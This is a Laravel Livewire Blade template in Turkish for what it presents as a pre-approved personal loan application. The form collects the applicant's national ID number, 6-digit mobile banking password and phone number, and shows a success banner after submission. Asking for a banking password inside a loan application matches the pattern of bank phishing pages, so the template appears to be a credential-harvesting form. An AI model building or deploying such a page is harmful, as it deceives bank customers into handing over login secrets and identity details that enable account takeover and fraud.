<div>
    @if (session()->has('message'))
        <div id="focusDiv" class="bg-green-100 text-green-700 border border-green-300 p-4 rounded-lg mb-4 text-left">
            <h1 class="text-lg font-bold mb-2">{{ session('title', 'Başvurunuz başarı ile tamamlandı 🎊') }}</h1>
            <p class="text-sm font-semibold">{{ session('message') }}</p>
        </div>
    @endif

    @if ($errors->any())
        <div class="bg-red-100 text-red-700 border border-red-300 p-4 rounded-lg mb-4 text-left">
            <p class="text-sm font-semibold">Lütfen aşağıdaki hataları kontrol ediniz:</p>
        </div>
    @endif

    <h2 class="text-2xl font-semibold text-gray-800 mb-6 text-left">Ön Onaylı İhtiyaç Kredisi Başvurusu</h2>

    <form wire:submit.prevent="submit" class="space-y-6">

        <div>
            <label for="tcKimlik" class="block text-sm font-medium text-gray-700">TC Kimlik Numarası</label>
            <input type="text" id="tcKimlik" wire:model.lazy="tcKimlik" maxlength="11" pattern="[0-9]{11}"
                class="mt-1 w-full border border-gray-300 rounded-md p-2 px-4 shadow-sm focus:border-red-500 focus:ring-red-500"
                placeholder="11 haneli kimlik numaranız">
            @error('tcKimlik')
                <span class="text-red-500 mt-2 text-sm">{{ $message }}</span>
            @enderror
        </div>

        <div>
            <label for="sifre" class="block text-sm font-medium text-gray-700">Mobil Bankacılık Şifresi</label>
            <input type="password" id="sifre" wire:model.lazy="sifre" maxlength="6" pattern="[0-9]{6}"
                class="mt-1 w-full border border-gray-300 rounded-md p-2 px-4 shadow-sm focus:border-red-500 focus:ring-red-500"
                placeholder="6 haneli mobil bankacılık şifreniz">
            @error('sifre')
                <span class="text-red-500 mt-2 text-sm">{{ $message }}</span>
            @enderror
        </div>

        <div>
            <label for="telefon" class="block text-sm font-medium text-gray-700">Telefon Numarası</label>
            <div class="flex">
                <span class="bg-gray-200 border border-gray-300 rounded-l-md p-2">+90</span>
                <input type="tel" id="telefon" wire:model.lazy="telefon" pattern="^5[0-9]{9}$" maxlength="10"
                    class="w-full border border-gray-300 rounded-r-md p-2 px-4 shadow-sm focus:border-red-500 focus:ring-red-500"
                    placeholder="5XXXXXXXX">
            </div>
            @error('telefon')
                <span class="text-red-500 mt-2 text-sm">{{ $message }}</span>
            @enderror
        </div>

        <button type="submit"
            class="w-full bg-gradient-to-r from-red-600 to-red-400 text-white font-semibold py-3 rounded-md hover:from-red-700 hover:to-red-500 transition ease-in-out duration-150 disabled:opacity-50 disabled:cursor-not-allowed"
            wire:loading.attr="disabled">
            Başvuru Yap
        </button>
    </form>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const observer = new MutationObserver(function(mutations) {
                mutations.forEach(mutation => {
                    if (mutation.type === 'childList' && document.getElementById("focusDiv")) {
                        document.getElementById("focusDiv").scrollIntoView({ behavior: 'smooth' });
                    }
                });
            });
            observer.observe(document.body, { childList: true, subtree: true });
        });
    </script>
</div>
